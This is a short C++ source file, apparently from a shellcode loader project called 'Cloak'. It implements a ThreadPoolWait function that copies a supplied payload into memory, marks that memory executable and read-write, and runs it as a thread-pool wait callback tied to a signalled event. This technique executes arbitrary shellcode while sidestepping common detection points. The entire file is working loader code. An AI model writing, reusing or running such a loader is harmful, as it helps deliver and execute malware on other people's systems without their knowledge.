#include "Cloak.hpp"

#ifdef THREADPOOLWAIT
BOOL ThreadPoolWait(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    PVOID       pPayloadAddress     = NULL;
    HANDLE      hEvent              = NULL;
    DWORD       dwOldProtect        = NULL;
    PTP_WAIT    pThreadPoolWait     = NULL;

    hEvent = CreateEventA( NULL, FALSE, TRUE, NULL );
    if ( hEvent == INVALID_HANDLE_VALUE ) {
        #ifdef DEBUG
        printf( "[-] CreateEventA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = VirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }
    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pThreadPoolWait = CreateThreadpoolWait( ( PTP_WAIT_CALLBACK ) pPayloadAddress, NULL, NULL );
    SetThreadpoolWait( pThreadPoolWait, hEvent, NULL );
    WaitForSingleObject( hEvent, WAIT_TIME );

    return TRUE;
}
#endif // !THREADPOOLWAIT